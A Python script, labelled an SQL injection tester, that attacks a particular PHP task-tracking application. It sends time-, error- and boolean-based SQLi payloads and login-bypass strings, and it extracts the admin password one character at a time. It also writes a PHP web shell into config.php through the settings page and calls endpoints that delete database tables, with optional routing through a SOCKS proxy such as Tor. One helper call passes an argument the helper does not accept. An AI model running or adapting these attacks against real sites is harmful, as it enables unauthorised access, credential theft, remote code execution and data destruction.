import requests
import time
import argparse
from urllib.parse import urljoin
import socks
import socket

class SQLiTester:
    def __init__(self, base_url, proxy=None):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        
        # Configure SOCKS proxy if provided
        if proxy:
            proxy_host, proxy_port = proxy.split(':')
            socks.set_default_proxy(
                socks.SOCKS5, 
                proxy_host, 
                int(proxy_port)
            )
            socket.socket = socks.socksocket
            print(f"🔵 Using SOCKS proxy: {proxy}")

    def _send_request(self, url, data=None, method='POST'):
        """Helper method to handle requests with error checking"""
        try:
            if method == 'POST':
                r = self.session.post(url, data=data, timeout=10)
            else:
                r = self.session.get(url, timeout=10)
            return r
        except Exception as e:
            print(f"⚠️ Request failed: {str(e)}")
            return None

    def test_increase_count(self):
        """Test the IncreaseCount() vulnerability"""
        print("\n🔴 [TEST] IncreaseCount() SQLi")
        url = urljoin(self.base_url, "/index.php")
        
        tests = [
            ("Column injection", {"e0": "100", "type": "error`=9999,`loads`=0 -- "}),
            ("Time-based", {"e0": "1000000' OR (SELECT SLEEP(3)) -- "}),
            ("Boolean-based", {"e0": "100' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables)) -- "})
        ]
        
        for name, payload in tests:
            start = time.time()
            r = self._send_request(url, data=payload)
            duration = time.time() - start
            
            if not r:
                continue
                
            status = "🚨 VULNERABLE" if r.status_code == 200 and duration < 3 else "✅ Protected"
            if "Time" in name and duration >= 3:
                status = "🚨 VULNERABLE (Blind)"
            print(f"{name:20} {status} (HTTP {r.status_code}, {duration:.2f}s)")

    def test_get_task_content(self):
        """Test GetTaskContent() vulnerability"""
        print("\n🔴 [TEST] GetTaskContent() SQLi")
        url = urljoin(self.base_url, "/index.php")
        
        tests = [
            ("Basic UNION", {"id": "test' UNION SELECT 1,2,3,4,5,6,7,8,9,10 -- ", "vs": "1", "lv": "0"}),
            ("Error-based", {"id": "test' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- ", "vs": "1", "lv": "0"}),
            ("Boolean-based", {"id": "test' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' -- ", "vs": "1", "lv": "0"})
        ]
        
        for name, payload in tests:
            r = self._send_request(url, data=payload)
            if not r:
                continue
                
            vulnerable = any(keyword in r.text for keyword in ["error in your SQL", "UNION", "@@version"])
            print(f"{name:20} {'🚨 VULNERABLE' if vulnerable else '✅ Protected'}")

    def test_login_bypass(self):
        """Test login.php bypass"""
        print("\n🔴 [TEST] Login Bypass")
        url = urljoin(self.base_url, "/login.php")
        
        payloads = [
            ("Basic bypass", {"login": "admin' -- ", "password": "anything"}),
            ("Password comment", {"login": "admin", "password": "wrong' OR '1'='1"}),
            ("Always true", {"login": "' OR 1=1 -- ", "password": ""})
        ]
        
        for name, payload in payloads:
            r = self._send_request(url, data=payload, allow_redirects=False)
            if not r:
                continue
                
            redirect = r.headers.get('Location', '')
            if "statistic.php" in redirect:
                print(f"{name:20} 🚨 VULNERABLE (Redirect to {redirect})")
            else:
                print(f"{name:20} ✅ Protected")

    def test_config_poisoning(self):
        """Test settings.php config injection"""
        print("\n🔴 [TEST] Config Poisoning")
        
        # Authenticate first (replace with valid creds)
        login_url = urljoin(self.base_url, "/login.php")
        auth = {"login": "root", "password": "root"}
        self._send_request(login_url, data=auth)
        
        # Test config modification
        settings_url = urljoin(self.base_url, "/settings.php")
        payload = {
            "submit": "1",
            "newlogin": "<?php system($_GET['cmd']);?>",
            "newpass": "test",
            "oldpass": "root"
        }
        self._send_request(settings_url, data=payload)
        
        # Verify config
        config_url = urljoin(self.base_url, "/config.php")
        r = self._send_request(config_url, method='GET')
        
        if r and "system($_GET" in r.text:
            print("🚨 Config file compromised (PHP code injected)")
        else:
            print("✅ Config file protected")

    def test_destructive_operations(self):
        """Test table deletion vulnerabilities"""
        print("\n🔴 [TEST] Destructive Operations")
        url = urljoin(self.base_url, "/settings.php")
        
        # Need to authenticate first
        login_url = urljoin(self.base_url, "/login.php")
        self._send_request(login_url, data={"login": "root", "password": "root"})
        
        tests = [
            ("Units deletion", {"clear": "1"}),
            ("Tasks deletion", {"cleartasks": "1"})
        ]
        
        for name, payload in tests:
            r = self._send_request(url, data=payload)
            if not r:
                continue
                
            # This just checks if the endpoint responds - real testing would need DB verification
            print(f"{name:20} {'🟡 Potentially vulnerable' if r.status_code == 200 else '✅ Protected'}")

    def run_all_tests(self):
        print(f"\n🚀 Starting comprehensive SQLi tests against {self.base_url}")
        self.test_increase_count()
        self.test_get_task_content()
        self.test_login_bypass()
        self.test_config_poisoning()
        self.test_destructive_operations()
        print("\n🔍 Test complete. Review results above.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Advanced SQL Injection Tester')
    parser.add_argument('--url', required=True, help='Base URL (e.g., http://example.com)')
    parser.add_argument('--proxy', help='SOCKS proxy (e.g., 127.0.0.1:9050)')
    args = parser.parse_args()
    
    tester = SQLiTester(args.url, args.proxy)
    tester.run_all_tests()
